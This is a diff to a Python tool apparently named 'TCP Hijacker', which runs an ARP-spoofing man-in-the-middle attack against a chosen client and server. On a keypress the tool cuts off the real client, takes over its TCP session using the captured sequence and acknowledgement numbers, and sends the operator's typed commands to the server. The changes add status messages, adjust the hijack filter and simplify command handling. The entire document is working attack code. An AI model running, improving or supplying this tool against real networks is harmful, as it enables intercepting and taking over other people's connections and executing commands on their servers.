@@ -103,6 +103,17 @@ if my_ip is None:
 my_mac = tools.get_mac_addr(if_name)
 client_mac = get_mac_addr(client_ip, if_name)
 server_mac = get_mac_addr(server_ip, if_name)
+
+# print some information
+tools.print_rgb('-- TCP Hijacker --',
+        rgb=(200, 150, 100), bold=True)
+tools.print_rgb(f'interface: {if_name} [{my_ip} ({my_mac})]',
+        rgb=(200, 200, 200), bold=False)
+tools.print_rgb(f'client: {client_ip}',
+        rgb=(200, 200, 200), bold=False)
+tools.print_rgb(f'server: {server_ip}:{server_port}',
+        rgb=(200, 200, 200), bold=False)
+
 arp_data_client = {'operation': 2,
         'src_addr': my_mac,
         'dst_addr': client_mac,
@@ -121,8 +132,6 @@ arp_data_server = {'operation': 2,
 arp_msg_server = eth.ArpMessage(arp_data_server)
 eth_handler = eth.EthernetHandler(if_name, local_mac=my_mac, remote_mac=client_mac, block=0)
 hijacked = False
-last_cmd = ''
-current_cmd = ''
 tcp_handler = None
 ch = chr(0)
 
@@ -131,10 +140,10 @@ term_attr = termios.tcgetattr(sys.stdin)
 try:
     tty.setcbreak(sys.stdin.fileno())
     new_tty_attr = termios.tcgetattr(sys.stdin)
-    tools.print_rgb(f'Spoofing connections to {server_ip}:{server_port}',
-            rgb=(200, 0, 0), bold=True)
-    tools.print_rgb('press H to hijack the session...',
+    tools.print_rgb(f'poisoning ARP caches every {interval//10**9} s',
             rgb=(100, 100, 100), bold=False)
+    tools.print_rgb('> press H to hijack the session; ^D to exit <',
+            rgb=(100, 100, 100), bold=True)
     while ord(ch) != 4: # 4 => ^D
         if time.time_ns() >= ctime + interval or ctime == 0:
             arp_msg_server.send(eth_handler.socket)
@@ -155,12 +164,8 @@ try:
                 # forward frames to their real destination but skip those for
                 # the hijacked connection
                 if hijacked and tcp_seg is not None:
-                    hijack_filter = [
-                            ip_pk.src_addr == client_ip or \
-                                    ip_pk.dst_addr == server_ip,
-                            tcp_seg.src_port == client_port or \
-                                    tcp_seg.dst_port == client_port
-                                    ]
+                    hijack_filter = [ip_pk.src_addr == client_ip, 
+                            client_port in (tcp_seg.src_port, tcp_seg.dst_port)]
                     if all(hijack_filter):
                         continue
                 elif tcp_seg is not None:
@@ -168,6 +173,9 @@ try:
                             ip_pk.dst_addr == server_ip,
                             tcp_seg.dst_port == server_port]
                     if all(hijack_filter):
+                        if client_port == 0:
+                            tools.print_rgb(f'client port: {tcp_seg.src_port}',
+                                    rgb=(100, 100, 100), bold=False)
                         print_seg(tcp_seg)
                         client_port = tcp_seg.src_port
                         seq_nr = tcp_seg.seq_nr
@@ -182,19 +190,17 @@ try:
             ch = sys.stdin.read(1)
             if hijacked:
                 if ord(ch) != 4:
-                    current_cmd += ch
-                    if ord(ch) == 10:
-                        last_cmd = current_cmd
-                        current_cmd = ''
                     try:
                         tcp_handler.send(ch.encode())
                     except errors.NoTCPConnectionException as e:
-                        tools.print_rgb('TCP not open; Aborting...',
+                        tools.print_rgb('TCP session not established; Abort!',
                                 rgb=(200, 100, 100), bold=True)
+                        hijacked = False
+                        break
             else:
                 if ch in ('h', 'H'):
-                    tools.print_rgb('entering hijacking mode',
-                            rgb=(100, 100, 100), bold=False)
+                    tools.print_rgb('Cutting off original client...',
+                            rgb=(200, 150, 100), bold=True, end='')
                     cut_off_client(if_name, client_ip, server_ip, client_port,
                             server_port, seq_nr, ack_nr)
                     # prepare TCP parameters and handler
@@ -208,11 +214,15 @@ try:
                     tcp_handler._rem_rwnd = 65535
                     tcp_handler.state = tcp.TCPHandler.ESTABLISHED
                     hijacked = True
+                    tools.print_rgb('connection hijacked!',
+                            rgb=(200, 150, 100), bold=True)
+                    tools.print_rgb('type some commands...\n\n',
+                            rgb=(100, 100, 100), bold=False)
                     new_tty_attr[3] |= termios.ECHO
                     termios.tcsetattr(sys.stdin, termios.TCSANOW, new_tty_attr)
         if hijacked:
             data = tcp_handler.receive(65535).decode()
-            if data != last_cmd and data != '':
+            if data != '':
                 print(data, end='')
 finally:
     termios.tcsetattr(sys.stdin, termios.TCSADRAIN, term_attr)
